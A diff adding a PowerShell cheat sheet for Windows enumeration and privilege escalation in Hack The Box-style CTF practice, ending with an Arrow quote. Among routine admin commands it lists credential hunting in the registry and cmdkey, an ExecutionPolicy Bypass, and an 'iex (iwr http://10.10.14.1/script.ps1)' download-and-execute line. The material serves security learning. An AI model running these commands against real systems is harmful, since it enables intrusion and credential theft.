@@ -1,0 +1,90 @@
+1. Basic System Enumeration
+whoami
+hostname
+systeminfo
+Get-ComputerInfo
+Get-LocalUser
+Get-LocalGroup
+Get-LocalGroupMember Administrators
+
+2. File & Directory Recon
+dir
+ls
+Get-ChildItem -Recurse
+Get-Content file.txt
+type file.txt
+ *Search for interesting files
+Get-ChildItem -Path C:\ -Include *.txt,*.xml,*.config -Recurse -ErrorAction SilentlyContinue
+
+3. Permissions & Privilege Checks
+whoami /priv
+whoami /groups
+ *Check for file permissions
+icacls file.exe
+
+4. Processes & Services (Very Important in HTB
+Get-Process
+Get-Service
+Get-Service | Where-Object {$_.Status -eq "Running"}
+ *Look for weak services
+Get-WmiObject win32_service | Select Name, StartName, PathName
+
+5. Network Enumeration
+ipconfig
+netstat -ano
+arp -a
+route print
+Get-NetTCPConnection
+Get-NetIPAddress
+
+6. User & Credential Hunting
+cmdkey /list
+ *Search registry for creds
+reg query HKLM /f password /t REG_SZ /s
+
+7.File Download / Upload (CTF Essential)
+Invoke-WebRequest http://10.10.14.1/file.exe -OutFile file.exe
+*Shortened 
+iwr http://10.10.14.1/file.ps1 -o file.ps1
+
+8. Script Execution (Common in PrivEsc)
+powershell -ExecutionPolicy Bypass -File script.ps1
+or
+iex (iwr http://10.10.14.1/script.ps1)
+
+9. Encoding & Decoding (Payload Stuff)
+ *Encode
+[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("text"))
+ *Decode
+[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("encoded"))
+
+10. Environment & Variables
+Get-ChildItem Env:
+echo $env:USERNAME
+echo $env:PATH
+Get-MpComputerStatus
+
+11. AV & Defender Checks
+Get-MpComputerStatus
+Get-MpPreference
+
+=============================
+
+
+"...Keep on learning
+ Keep on training 
+ Keep on getting smarter"
+- Oliver Queen
+Arrow (U.S. TV series)
+
+
+
+
+
+
+
+
+
+
+
+
